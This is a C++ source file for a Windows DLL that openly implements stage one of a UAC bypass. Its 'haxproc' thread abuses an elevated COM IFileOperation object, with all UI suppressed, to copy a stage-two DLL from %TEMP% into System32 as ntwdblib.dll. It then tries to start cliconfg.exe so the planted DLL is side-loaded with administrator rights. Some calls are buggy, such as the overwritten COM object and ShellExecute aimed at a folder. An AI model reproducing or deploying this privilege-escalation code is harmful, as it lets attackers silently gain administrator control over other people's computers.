// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#define _CTR_SECURE_NO_WARNINGS
#define DBG true

#include <windows.h> //win api
#include <thread>    //c++11 threading
#include <Shobjidl.h>//COM interface
#include <Shellapi.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

void debug(const char *text)
{
	std::cout << text << std::endl;
}

HRESULT CopyItem(__in LPCWSTR pszSrcItem, __in LPCWSTR pszDest, LPCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		IFileOperation *pfo = NULL;
		// Create an IShellItem from the supplied source path.
		IShellItem *psiFrom = NULL;
		IShellItem *psiTo = NULL;

		BIND_OPTS3 bopts;
		ZeroMemory(&bopts, sizeof(bopts));
		bopts.cbStruct = sizeof(bopts);
		bopts.hwnd = NULL;
		bopts.grfMode = STGM_READWRITE;
		bopts.dwClassContext = CLSCTX_LOCAL_SERVER;

		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bopts, IID_PPV_ARGS(&pfo));

		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation,NULL,CLSCTX_ALL,IID_PPV_ARGS(&pfo));
		if (SUCCEEDED(hr))
		{
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags(FOF_NO_UI);
			if (SUCCEEDED(hr))
			{
				
				hr = SHCreateItemFromParsingName(pszSrcItem,NULL,IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{
					

					if (NULL != pszDest)
					{
	
						hr = SHCreateItemFromParsingName(pszDest,NULL,IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{

						// Add the operation
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}
					
					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					// Perform the operation to copy the file.
					hr = pfo->PerformOperations();
				}
			}

			// Release the IFileOperation interface.
			pfo->Release();
		}

		CoUninitialize();
	}
	return hr;
}

DWORD WINAPI haxproc()
{
	debug("[>] Preparing Enviroment");
	//Resolve %TEMP% path
	wchar_t* source;
	source = _wgetenv(L"TEMP");
	wcscat(source, L"\\stage2.dll");

	std::wstring str(source);
	
	LPCWSTR temp = str.c_str();
	

	debug("[>] Using IFileOperation to install stage2...");
	//Calls the COM interface to copy the stage 2 dll to the Windows path
	HRESULT test = CopyItem(temp, L"C:\\Windows\\System32", L"ntwdblib.dll"); //Resolve the windows path it may not be in C:

	if (SUCCEEDED(test))
	{
		debug("[OK]");
	}
	else
	{
		debug("[FAIL]");
		Sleep(1000);
		return true; //end
	}

	debug("[>] Starting cliconfg...");
	HINSTANCE res = ShellExecute(NULL, "open", "C:\\Windows\\System32", NULL, NULL, 3);

	if ((int)res>32)
	{
		debug("[OK]");
	}
	else
	{
		debug("[FAIL]");
		Sleep(1000);
		return true;
	}

	debug("[>] Stage 1 completed");



	return 0;
}


//cliconfg	C:\Windows\System32\	ntwdblib.dll for Windows 7, 8 and 10	C:\Windows\System32\cliconfg.exe


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	
	AllocConsole();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);
	debug("[Stage 1 Started]");


	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)haxproc, NULL, 0, 0);	


	return TRUE;//Shit, may I use  true or TRUE ?
}

